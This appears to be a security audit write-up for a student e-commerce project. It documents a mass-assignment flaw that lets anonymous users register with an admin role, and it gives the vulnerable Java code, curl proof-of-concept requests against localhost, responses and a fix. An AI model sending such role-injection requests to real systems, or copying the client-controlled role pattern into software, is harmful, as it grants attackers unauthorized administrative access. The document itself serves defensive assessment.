# V03: Privilege Escalation via Client-Controlled Role Assignment During Registration

## 1. Vulnerability Overview
* **ID**: `V03`
* **Title**: Privilege Escalation via Client-Controlled Role Assignment During Registration (Mass Assignment)
* **Severity Rationale**: **CRITICAL**. The user registration endpoint (`POST /api/v1/auth/register`) accepts an optional `role` parameter directly from the client. The backend does not restrict or validate which roles can be requested during public self-registration. An anonymous external attacker can register an account specifying `role=ROLE_ADMIN` or `role=ROLE_SELLER`, instantly obtaining administrative or merchant privileges and bypassing all administrative review workflows.
* **Affected Endpoint**: `/api/v1/auth/register`
* **HTTP Method**: `POST`
* **Authentication Requirement**: **None** (Publicly accessible registration endpoint).

---

## 2. Source-Code Location & Implementation Analysis

### 2.1 Controller Implementation
The registration controller method is defined in `AuthController.java`:
* **File Link**: [AuthController.java](file:///c:/Users/CHAMILA/Desktop/SSD%20assignment/ecommerce-platform/backend/src/main/java/com/example/backend/auth/controller/AuthController.java#L51-L64)
* **Code Snippet**:
  ```java
  @PostMapping(value = "/register", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
  public ResponseEntity<RegisterResponse> register(
          @RequestParam String firstName,
          @RequestParam String lastName,
          @RequestParam String email,
          @RequestParam String password,
          @RequestParam(required = false) Role role,
          @RequestPart(value = "file", required = false) MultipartFile file) throws IOException {

      SignUpRequest dto = new SignUpRequest(firstName, lastName, email, password, role);
      RegisterResponse response = authService.register(dto, file);

      return ResponseEntity.status(HttpStatus.CREATED).body(response);
  }
  ```

### 2.2 Service Implementation
The business logic is implemented in `AuthServiceImpl.java`:
* **File Link**: [AuthServiceImpl.java](file:///c:/Users/CHAMILA/Desktop/SSD%20assignment/ecommerce-platform/backend/src/main/java/com/example/backend/auth/service/Impl/AuthServiceImpl.java#L70-L75)
* **Code Snippet**:
  ```java
  Users user = Users.builder()
          .firstName(signUpRequest.getFirstName())
          .lastName(signUpRequest.getLastName())
          .email(signUpRequest.getEmail())
          .password(passwordEncoder.encode(signUpRequest.getPassword()))
          .role(signUpRequest.getRole() != null ? signUpRequest.getRole() : Role.ROLE_USER)
          .enabled(false)
          .emailVerified(false)
          .build();
  ```
* **Root Cause Analysis**: The controller accepts `@RequestParam(required = false) Role role` and passes it directly to `SignUpRequest`. The service layer checks `signUpRequest.getRole() != null ? signUpRequest.getRole() : Role.ROLE_USER`. Instead of enforcing that public registrants can *only* be assigned `ROLE_USER`, the server unconditionally respects whatever role string the untrusted client supplied.

---

## 3. Runtime Verification & Test Evidence

### 3.1 Exact Test Request
1. Registration with `role=ROLE_ADMIN`:
   ```bash
   curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X POST http://localhost:8080/api/v1/auth/register \
     -F "firstName=Escalated" \
     -F "lastName=Admin" \
     -F "email=audit_escalated_admin@test.com" \
     -F "password=[REDACTED_PASSWORD]" \
     -F "role=ROLE_ADMIN"
   ```

2. Account Verification & Login:
   - Account activated via `GET /api/v1/auth/verify-email?token=[REDACTED_TOKEN]`
   - Login via `POST /api/v1/auth/login`

3. Privileged Endpoint Probe:
   ```bash
   curl -s -w "\nHTTP_STATUS:%{http_code}\n" \
     -H "Authorization: Bearer [REDACTED_ESCALATED_JWT]" \
     http://localhost:8080/api/v1/seller/seller-requests
   ```

### 3.2 Actual Response Summary
* **Registration HTTP Status**: `201 Created`
* **Registration Body**:
  ```json
  {
    "message": "User registered. Please check your email for verification.",
    "profileImageUrl": null,
    "verificationToken": "[REDACTED_TOKEN]"
  }
  ```
* **Login Response Payload**:
  ```json
  {
    "message": "Login successful",
    "accessToken": "[REDACTED_JWT]",
    "refreshToken": "[REDACTED_JWT]",
    "email": "audit_escalated_admin@test.com",
    "firstName": "Escalated",
    "lastName": "Admin",
    "profileImageUrl": null,
    "role": "ROLE_ADMIN"
  }
  ```
* **Privileged Endpoint Response (`GET /api/v1/seller/seller-requests`)**:
  - For legitimate `ROLE_USER`: HTTP `500` / Access Denied.
  - For `audit_escalated_admin@test.com`: HTTP `200 OK` (Body: `[]`).

---

## 4. Security Assessment & Classification

### 4.1 Vulnerability Confirmation
* **Status**: **CONFIRMED VULNERABILITY**
* **Verification Detail**: An unauthenticated user registered with `role=ROLE_ADMIN`. Upon verification, the user logged in, was issued a JWT containing `authorities: ["ROLE_ADMIN"]`, and successfully accessed the administrative endpoint `GET /api/v1/seller/seller-requests` with HTTP `200 OK`.

### 4.2 Security Impact
1. **Total System Compromise**: Any anonymous user can grant themselves administrative privileges (`ROLE_ADMIN`), enabling access to all category operations, seller request reviews, merchant onboarding decisions, and system resources.
2. **Bypass of Merchant KYC Verification**: A user can register as `ROLE_SELLER` directly, bypassing the legitimate seller application and document verification process implemented in `SellerController`.

### 4.3 Classification Standards
* **OWASP Top 10 Category**: `A01:2021 – Broken Access Control`
* **CWE Identifier**: `CWE-269` (Improper Privilege Management) / `CWE-915` (Improperly Controlled Modification of Dynamically-Determined Object Attributes - Mass Assignment)

### 4.4 Distinction from Other Vulnerabilities
* **Distinctive Aspect**: `V03` represents an authorization boundary violation through mass assignment of entity properties during public signup. It is completely distinct from `V01` (accidental exposure of a debug endpoint), `V02` (recovery OTP disclosure), and `V04` (email verification token disclosure).

---

## 5. Remediation & Retest Guidance

### 5.1 Recommended Fix Direction
1. **Hardcode Default Role on Public Registration**: Remove the `role` parameter from `AuthController.register()` and `SignUpRequest`.
2. **Enforce Role Assignment in Service**: Explicitly assign `Role.ROLE_USER` to all accounts created through public registration.
3. **Dedicated Admin Provisioning**: Implement a separate, authenticated endpoint accessible only to existing administrators (`@PreAuthorize("hasRole('ADMIN')")`) for promoting users or assigning administrative roles.

### 5.2 Exact Retest Procedure
1. Send registration request with `role=ROLE_ADMIN`:
   ```bash
   curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X POST http://localhost:8080/api/v1/auth/register \
     -F "firstName=Attacker" \
     -F "lastName=Test" \
     -F "email=attacker@test.com" \
     -F "password=AttackerPass123!" \
     -F "role=ROLE_ADMIN"
   ```
2. **Expected Secure Result**:
   - The server either rejects the unexpected `role` parameter (HTTP `400 Bad Request`), or ignores it and creates the account strictly with `ROLE_USER`.
   - Logging in as `attacker@test.com` must yield `role: "ROLE_USER"`.
   - Attempting `GET /api/v1/seller/seller-requests` must return HTTP `403 Forbidden`.
